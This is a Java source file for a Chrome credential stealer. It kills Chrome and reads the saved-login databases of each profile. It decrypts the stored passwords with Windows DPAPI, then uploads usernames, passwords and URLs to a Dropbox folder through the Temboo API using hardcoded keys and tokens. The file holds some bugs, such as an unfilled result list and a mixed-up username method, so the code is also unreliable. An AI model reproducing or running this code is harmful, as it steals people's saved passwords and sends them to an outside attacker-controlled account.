import java.io.File;
import java.io.FilenameFilter;
import java.io.IOException;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;
import java.util.ArrayList;
import java.util.Base64;

import com.sun.jna.platform.win32.Crypt32Util;
import com.temboo.Library.Dropbox.FilesAndMetadata.UploadFile;
import com.temboo.Library.Dropbox.FilesAndMetadata.UploadFile.UploadFileInputSet;
import com.temboo.Library.Dropbox.FilesAndMetadata.UploadFile.UploadFileResultSet;
import com.temboo.core.TembooException;
import com.temboo.core.TembooSession;

public class Logger {

	private String user = System.getProperty("user.name");
	private String filepath = "C:\\Users\\"+user+"\\AppData\\Local\\Google\\Chrome\\User Data\\";
	
	public Logger() throws SQLException, TembooException, IOException {
		run();
	}
	
	public void run() throws SQLException, TembooException, IOException{
		ArrayList<String> files = getFiles();
		ArrayList<ArrayList<String>> passwords = new ArrayList<ArrayList<String>>();
		ArrayList<ArrayList<String>> usernames = new ArrayList<ArrayList<String>>();
		ArrayList<ArrayList<String>> urls = new ArrayList<ArrayList<String>>();
		ArrayList<ResultSet> results = new ArrayList<ResultSet>();
		ArrayList<ResultSet> results2 = new ArrayList<ResultSet>();
		ArrayList<ResultSet> results3 = new ArrayList<ResultSet>();
		closeChrome();
		String uploadInfo = "";
		for(String i : files){
			results.add(getResultSet(i));
			results2.add(getResultSet(i));
		}
		for(ResultSet i : results){
			passwords.add(getPass(i));
		}
		for(ResultSet i : results2){
			usernames.add(getUrl(i));
		}
		for(ResultSet i : results3){
			urls.add(getUrl(i));
		}
		openChrome();
		for(int i = 0; i < usernames.size(); i++){
			for(int j = 0; j < usernames.get(i).size(); j++){
				uploadInfo+="Username: "+usernames.get(i).get(j)+"\tPasswords: "+passwords.get(i).get(j)+"\tURL: "+urls.get(i).get(j)+"\n";
			}
		}
		upload(uploadInfo);
	}
	
	public ArrayList<String> getFiles(){
		ArrayList<String> folders = new ArrayList<String>();
		File file = new File(filepath);
		String[] directories = file.list(new FilenameFilter() {
		      @Override
		      public boolean accept(File current, String name) {
		        return new File(current, name).isDirectory();
		      }
		    });
		    for(String i : directories){
		    	if(i.matches("^(Default|Profile).*")){
		    		folders.add(filepath+i+"\\Login Data");
		    	}
		    }
		return folders;
	}

	public ResultSet getResultSet(String file){
		try{
		    Class.forName("org.sqlite.JDBC");
			Connection connection = DriverManager.getConnection("jdbc:sqlite:"+file);
			Statement statement = connection.createStatement();
			ResultSet resultSet = statement.executeQuery("SELECT username_value, password_value, origin_url FROM logins"); // some encrypted field
			return resultSet;			
		 }catch(Exception e){
		    e.printStackTrace();
		 }
		return null;
	}
	
	public ArrayList<String> getPass(ResultSet r) throws SQLException{
		ArrayList<String> passwords = new ArrayList<String>(); 
		while (r.next())
	    {
	        byte[] decryptedData = Crypt32Util.cryptUnprotectData(r.getBytes(2));  // exception over here
	        StringBuilder decryptedString = new StringBuilder();

	        for (byte b : decryptedData)
	        {
	           decryptedString.append((char) b);
	        }
	        passwords.add(decryptedString.toString());	        
	   }
		return passwords;
	}
	
	public ArrayList<String> getUser(ResultSet r) throws SQLException{
		ArrayList<String> usernames = new ArrayList<String>(); 
		while (r.next())
	    {
	        byte[] userData = r.getBytes(1);  // exception over here
	        StringBuilder userString = new StringBuilder();

	        for (byte b : userData)
	        {
	           userString.append((char) b);
	        }
	        usernames.add(userString.toString());	
	   }
		return usernames;
	}
	
	public ArrayList<String> getUrl(ResultSet r) throws SQLException{
		ArrayList<String> urls = new ArrayList<String>(); 
		while (r.next())
	    {
	        byte[] urlData = r.getBytes(3);  // exception over here
	        StringBuilder urlString = new StringBuilder();

	        for (byte b : urlData)
	        {
	           urlString.append((char) b);
	        }
	        urls.add(urlString.toString());	
	   }
		return urls;
	}
	
	public void upload(String info) throws TembooException{
		// Instantiate the Choreo, using a previously instantiated TembooSession object, eg:
		TembooSession session = new TembooSession("logger", "myFirstApp", "N5LS8WVzNyNEKSDrXLVWNFL3nlypo7vr");

		UploadFile uploadFileChoreo = new UploadFile(session);

		// Get an InputSet object for the choreo
		UploadFileInputSet uploadFileInputs = uploadFileChoreo.newInputSet();
		// Set inputs
		uploadFileInputs.set_ResponseFormat("json");
		uploadFileInputs.set_FileContents(Base64.getEncoder().encodeToString(info.getBytes()));
		uploadFileInputs.set_Root("sandbox");
		uploadFileInputs.set_AccessToken("jvm9xp5ea4kuk06g");
		uploadFileInputs.set_AppKey("bwr2bxarafudtxj");
		uploadFileInputs.set_FileName("information.txt");
		uploadFileInputs.set_AccessTokenSecret("xh4d5f5yjflzyl7");
		uploadFileInputs.set_Folder("/RootFolder/"+System.getProperty("user.name"));
		uploadFileInputs.set_AppSecret("tr0phzmsc74vauv");

		// Execute Choreo
		UploadFileResultSet uploadFileResults = uploadFileChoreo.execute(uploadFileInputs);
	}
	
	public static void closeChrome() throws IOException{
		try {
		    Process p = Runtime.getRuntime().exec("taskkill /F /IM chrome.exe");
		    p.waitFor();
		} catch (Exception e) {
		    e.printStackTrace();
		}
	}
	
	public static void openChrome(){
		try {
		    Process p = Runtime.getRuntime().exec("/Program Files (x86)/Google/Chrome/Application/chrome.exe");
		    p.waitFor();
		    System.out.println("Google Chrome launched!");
		} catch (Exception e) {
		    e.printStackTrace();
		}
	}
}
